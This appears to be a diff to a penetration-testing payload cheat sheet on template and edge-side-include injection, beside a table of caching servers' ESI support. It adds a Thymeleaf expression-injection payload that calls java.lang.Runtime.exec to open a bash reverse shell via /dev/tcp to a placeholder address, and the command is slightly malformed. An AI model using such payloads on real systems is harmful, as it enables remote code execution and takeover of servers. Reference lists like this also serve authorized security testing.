@@ -47,6 +47,9 @@ Surrogate-Control: content="ESI/1.0"
 
 <p th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('')}">vcs</p>
 
+th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c $@|bash
+0 echo bash -i >& /dev/tcp/ip/port/ip/ 0>&1')}">Hello!
+
 | Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
 | -------- | -------- | ---- | ------- | ------------------------- | -------------- |
 | Squid3   | Yes      | Yes  | Yes     | Yes                       | No             |
